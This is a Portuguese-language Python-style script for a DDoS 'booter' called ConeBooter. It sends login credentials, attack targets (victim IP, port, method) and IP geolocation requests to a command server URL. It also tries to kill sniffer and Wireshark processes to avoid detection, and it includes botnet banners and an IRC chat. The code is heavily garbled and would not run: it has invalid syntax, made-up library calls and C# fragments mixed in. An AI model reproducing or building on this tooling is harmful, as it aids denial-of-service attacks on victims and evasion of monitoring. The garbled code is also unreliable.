# -*- coding: utf-8 -*-

import sys, fcntl, struct
import os
import socket
import requests
import threading
import psutil
import win32crypt
import ctypes
import json

class login():
  inUsuario = raw_input("[>>] Causo não tenha uma conta, contate-nos!\n[SKYPE] live:omundosant\n[!] Usúario para login: ")
  inSenha = raw_input("[!] Senha para login: ")

  try inUsuario():
    WUsers = ["www.coneBooter33stile.hostinger.com/accounts?chk=" + inUsuario + inSenha + "&", str(format.json)]
       if requests.fopen(WUsers = "Conta inexistente!"):
         lbErro = ("_Impossivel conectar!_")
         return WUsers  
  else:
    socket.setblocking(false=0)
    lbErro = ("_Verifique a conexão com a internet!_")
  
def checkar_hd():
   nSucesso = 0
   nErro = 0

   try nSucesso():
    sys.version_info(2, 7)
     INDEX = 0
      print("[#] Para o script funcionar atualize seu python para uma versão posterior!")
   else:
    sys.version_info(3)
     INDEX = 7
      ctypes.windll.kernel32.SetConsoleTitleW(">> ConeBooter - version demo! #Sant")

   try nErro():
    if checkar_hd < 0:
       wClient = ["www.coneBooter33stile.hostinger.com/checkar?user=" + inUsuario + "&senha=" + inSenha]
       requests.fopen(wClient + "/" + "?"  + "user=", format(json = "Logado com Sucesso no ConeBooter"))
       print("[+] Logado com sucesso!\n[#] Bem vindo ao ConeBooter %s" + inUsuario)
    else:
       print(lbErro = "_Você não tem acesso ao ConeBooter!")
    elif:
        pids = []
        process = os.popen('smsniff', 'sniffpass.exe', 'wireshark.exe') 
          for process in psutil.process_iter():
             print("[<<] Processo de sniffers detectados, tentativa de burlamento!")
            if proc.name() == process:
              proc.kill()
             print("[<<] sniffer %s fechado com sucesso!\n[<<] Seu HD esta salvo!", process.pid())
             salvarHD = [checkar_hd(ctypes.kernel32.HDWID_s22) = wClient("www.coneBooter33stile.hostinger.com/?hdsave=" + checkar_hd)] 
             sys.exit(1)

class banners():
    botnet = """
  _____ _____   _____                       
 |_   _|  __ \ / ____|                      
   | | | |__) | |     ___ _ __ _____      __
   | | |  _  /| |    / __| '__/ _ \ \ /\ / /
  _| |_| | \ \| |___| (__| | |  __/\ V  V / 
 |_____|_|  \_\\_____\___|_|  \___| \_/\_/  

 [-*-] Diretamente de Narnia!

 [#-#] Botnet privada da ConeCrew.

 [!!!] Cópia não comédia

 [!!!] Botnet persistente em 32 payloads
 cada um tem uma TLL de 10gb.

    """

 geoIP = """
   _____           _____ _____  
  / ____|         |_   _|  __ \ 
 | |  __  ___  ___  | | | |__) |
 | | |_ |/ _ \/ _ \ | | |  ___/ 
 | |__| |  __/ (_) || |_| |     
  \_____|\___|\___/_____|_| 

 [-*-] Localizador persistente em radar e streetView

 [#-#] Logo IP colocado no INPUT de DDoS sera trazido logo aqui

 [!!!] shin0bi págua kkkkk
 """

 scanTraf = """
   _____              _______         __ _           
  / ____|            |__   __|       / _(_)          
 | (___   ___ __ _ _ __ | |_ __ __ _| |_ _  ___ ___  
  \___ \ / __/ _` | '_ \| | '__/ _` |  _| |/ __/ _ \ 
  ____) | (_| (_| | | | | | | | (_| | | | | (_| (_) |
 |_____/ \___\__,_|_| |_|_|_|  \__,_|_| |_|\___\___/ 

 [-*-] Não achamos muito necessário por que usamos
 mais a botnet para ataques http, sem precisar da utilidade
 disso, persiste streeView e radar também!
 """

 mChat = """
[###########################]
[CHAT IRC - CONECREW MEMBROS]
 """

def botnet():
    IRC = wClient["www.coneBooter33stile.hostinger.com/bircone?t1.php"]
    atkIniciar = []
    atkParar = []

    if IRC(0):
      print(banners.Botnet)
      inVitima = input(">>" + "VITIMA(" + " " + ")" + "<<", sys.argv[6])
      inPorta = input(">>" + "PORTA(" + " " + ")" + "<<", str)
       inMetodos = wClient[">> METODOS" + "{}" + "www.coneBooter33stile.hostinger.com/bircone?metodos.php".readlines[format.json], sys.number[]]
    
    __init__(go):
         go = wClient[IRC = "/vitima=" + inVitima + "&port=" + inPorta + "&method=" + inMetodos]
          atkIniciar = ["__Ataque iniciado ao IP " + inVitima + " na porta " + inPorta "__"]

         if go():
           int KeyboardInterrupt():
               atkParar = ["__Ataque parado com sucesso__"]
           else:
               atkParar = ["__Não foi possivel inicitar ataque__"]

def geoIP():
    GEO = wClient["www.coneBooter33stile.hostinger.com/location?ip="]
    inIP = []

    if GEO(0):
       print(banners.geoIP)
       inIP = input(">> DIGITE O IP PARA LOCALIZAR -> ", str)
       radarStreet = wClient["www.coneBooter33stile.hostinger.com/radar?ip=" + inIP + GEO = inIP]
    elif:
       lbErro = ["[!] Não foi possivel localizar o IP"]
    else:
       radarStreet = 0
       lbErro = ["[!] Não foi possivel utilizar o radar"]


def scanTraf():
    
    print(banners.scanTraf)

    from socket import SOCK_DGRAM, AF_INET

    ALL_CONNECTIONS = socket.interface(netifaces.interfaces())
    MY_IP = socket.gethostname(socket.gethostbyname())
    STARTED = bool()

    IP_FROM = IPAddress()
    IP_TO = IPAddress()
    BYTE_DATA = [4096]

    DES_PORT = uniform(str)
    SRC_PORT = uniform(str)

    lbCapturado = ("[>>] IP Capturado ", ":%s".format(today))
    lbError = ("[!!] Não foi possivel capturar IP, tente reiniciar o APP!", sys.exit(1))

    ctrIPResolver = ("[#] Lista de IP Capturados ->\n[{}]").format(sys.argv[1])

   if STARTED:
        READ_LENGHT = uniform(BitConverter.ToSingle(16, bytez), 0)
            SRC_PORT = BitConverter.ToSingle(16, bytez(BYTE_DATA, 22), 0)
            DES_PORT = BitConverter.ToSingle(16, bytez(BYTE_DATA, 24), 0)

              IP_FROM = IPAddress(BitConverter.ToSingle(32, bytez, 12))
              IP_TO = IPAddress(BitConverter.ToSingle(32, bytez, 16))

          ListIP.ctrIPResolver("\n:\n"(sizeof))
          break;         
          socket.socket(NetworkToHostOrder(BYTE_DATA, 0, BYTE_DATA.lenght, flags="FA", AsyncCallBack(sizeof), not))

   if BYTE_DATA[9]:
          IP_FROM.format(str, IPV4 + DES_PORT=80 + IP_TO.format_startswith("104") = False)
          input("[>>] Aperte alguma tecla para continuar")
          STARTED = False
          break;

   if IP_TO.format_startswith("40."):
          print(lbCapturado + ":" + IP_TO.format + ":" + DES_PORT)
          sys.exit(1)
          break;

def Byteswap(bytez, uniform): 
   from result[0] import Byte  
   result[0] = bytez(+1)
   result[1] = bytez[0]
   return result;  

def bindsocket():
   socket.bind(IPAddress(MY_IP, PORTA))
   socket.setsockopt(socket.D_GRAM, cannoname.header(True))
   from bytrue[] import Byte *
   from byout[] import Byte * 
   Byte = [{1, 0, 0, 0,}, {1, 0, 0, 0,}]    
   socket.ioctl(socket.ioctl_recv, bytrue, byout)
   socket.setblocking(False)
   if BYTE_DATA(socket.recv_into):
      socket.socket(NetworkToHostOrder(BYTE_DATA, 0, BYTE_DATA.lenght, flags="None", AsyncCallBack(), not))
   else:
      print("[!!] Scan Trafic sera reiniciado!", sys.argv[3], time.sleep(3), sys.exit(1))   

def chat():
  CHAT = wClient["www.coneBooter33stile.hostinger.com/?mchat="]

  if (chat == IRC):
    print(banners.mChat)
    sendM = input("[>>] %s" + inUsuario + " : ", wClient)
     if sendM():
       print(lbErro = "__Tente reconectar__")
      sys.exit():

# Copia não comédia!
# Produzido por @Sant 
